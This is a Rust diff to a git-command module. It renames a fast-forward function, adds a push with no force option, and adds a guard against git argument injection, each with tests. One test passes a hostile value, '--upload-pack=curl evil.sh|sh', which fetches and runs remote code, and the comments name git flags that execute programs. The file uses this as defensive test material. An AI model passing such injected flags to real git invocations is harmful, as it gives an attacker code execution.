@@ -421,7 +421,7 @@ pub async fn fetch(repo: &Path, timeout: Duration) -> Result<(), GitError> {
 /// said nothing.
 ///
 /// One implementation, added 2026-07-31 on David's ruling after a review found
-/// this block written out verbatim in both `fetch` and `fast_forward`. The
+/// this block written out verbatim in both `fetch` and `pull_ff`. The
 /// module already had an idiom for a hard-fail exit (`is_dirty`, and `fetch`'s
 /// own `git remote` pre-check); a second one inlined in two places is how a
 /// third caller ends up copying the wrong one.
@@ -496,11 +496,41 @@ pub async fn verdict(repo: &Path, timeout: Duration) -> Result<Verdict, GitError
 /// Callers must only reach this for `Verdict::Behind`. It is safe if they do
 /// not — git refuses — but the report would then carry a failure the sweep
 /// could have predicted.
-pub async fn fast_forward(repo: &Path, timeout: Duration) -> Result<(), GitError> {
+pub async fn pull_ff(repo: &Path, timeout: Duration) -> Result<(), GitError> {
     require_ok(
         run_git(repo, &["merge", "--ff-only", "@{u}"], timeout).await?,
         "git merge --ff-only",
     )
+}
+
+/// Reject a request-derived value that git would read as a flag.
+///
+/// Argv already defeats the shell — there is no string for a metacharacter to
+/// live in. It does NOT defeat git's own argument parsing: a value beginning
+/// with `-` is a flag, and git has flags that execute programs
+/// (`--upload-pack`, `--exec-path`, `-c core.sshCommand=…`). That is a known
+/// RCE class and it survives every shell-injection defence.
+///
+/// Callers additionally pass `--` before value-shaped arguments. Both, not
+/// either: this is the rule, and `--` is what makes forgetting it survivable.
+pub fn validate_arg(value: &str) -> Result<(), GitError> {
+    if value.starts_with('-') {
+        return Err(GitError::Failed(format!(
+            "refusing a value that git would read as a flag: {value:?}"
+        )));
+    }
+    Ok(())
+}
+
+/// `git push`. No `--force`, no `--force-with-lease`, no refspec — the branch
+/// and its upstream come from the repo's own config, so nothing here is
+/// request-derived.
+///
+/// A non-fast-forward is a nonzero exit and therefore an `Err`, and that is
+/// the whole safety story: a diverged branch is refused by git rather than
+/// resolved by us.
+pub async fn push(repo: &Path, timeout: Duration) -> Result<(), GitError> {
+    require_ok(run_git(repo, &["push"], timeout).await?, "git push")
 }
 
 #[cfg(test)]
@@ -700,17 +730,17 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn fast_forward_applies_the_remote_commits() {
+    async fn pull_ff_applies_the_remote_commits() {
         let (remote, clone) = remote_and_clone();
         advance_remote(&remote);
         fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();
-        fast_forward(&clone, DEFAULT_TIMEOUT).await.unwrap();
+        pull_ff(&clone, DEFAULT_TIMEOUT).await.unwrap();
         assert!(clone.join("from-elsewhere.md").exists());
         assert_eq!(verdict(&clone, DEFAULT_TIMEOUT).await.unwrap(), Verdict::Current);
     }
 
     #[tokio::test]
-    async fn fast_forward_refuses_a_diverged_branch_and_leaves_head_unmoved() {
+    async fn pull_ff_refuses_a_diverged_branch_and_leaves_head_unmoved() {
         let (remote, clone) = remote_and_clone();
         advance_remote(&remote);
         commit(&clone, "local-only.md", "mine");
@@ -720,7 +750,7 @@ mod tests {
             .await
             .unwrap()
             .stdout;
-        assert!(fast_forward(&clone, DEFAULT_TIMEOUT).await.is_err());
+        assert!(pull_ff(&clone, DEFAULT_TIMEOUT).await.is_err());
         let after = run_git(&clone, &["rev-parse", "HEAD"], DEFAULT_TIMEOUT)
             .await
             .unwrap()
@@ -729,6 +759,43 @@ mod tests {
         assert_eq!(before, after, "a refused fast-forward must not move HEAD");
         // And no merge was created behind our back.
         assert!(!clone.join("from-elsewhere.md").exists());
+    }
+
+    #[test]
+    fn validate_arg_rejects_a_leading_dash() {
+        // Argv defeats the SHELL. It does not defeat git's own flag parsing:
+        // --upload-pack and -c core.sshCommand= execute programs. This is the
+        // guard, and it runs before run_git rather than trusting `--`.
+        assert!(validate_arg("main").is_ok());
+        assert!(validate_arg("feat/x").is_ok());
+        assert!(validate_arg("--upload-pack=curl evil.sh|sh").is_err());
+        assert!(validate_arg("-c").is_err());
+    }
+
+    #[tokio::test]
+    async fn push_sends_local_commits_to_the_remote() {
+        let (remote, clone) = remote_and_clone();
+        commit(&clone, "mine.md", "local work");
+        push(&clone, DEFAULT_TIMEOUT).await.unwrap();
+
+        // Verified from a THIRD checkout, not from the pusher's own refs — the
+        // pusher's origin/main moves whether or not the remote accepted it.
+        let verify = tempfile::tempdir().unwrap().keep();
+        git_sync(&verify, &["clone", remote.to_str().unwrap(), verify.to_str().unwrap()]);
+        assert!(verify.join("mine.md").exists(), "the remote never received the commit");
+    }
+
+    #[tokio::test]
+    async fn push_fails_on_a_diverged_branch_rather_than_forcing() {
+        let (remote, clone) = remote_and_clone();
+        advance_remote(&remote);
+        commit(&clone, "mine.md", "local work");
+        fetch(&clone, DEFAULT_TIMEOUT).await.unwrap();
+        assert!(push(&clone, DEFAULT_TIMEOUT).await.is_err());
+
+        let verify = tempfile::tempdir().unwrap().keep();
+        git_sync(&verify, &["clone", remote.to_str().unwrap(), verify.to_str().unwrap()]);
+        assert!(!verify.join("mine.md").exists(), "a refused push must not land");
     }
 
     #[tokio::test]
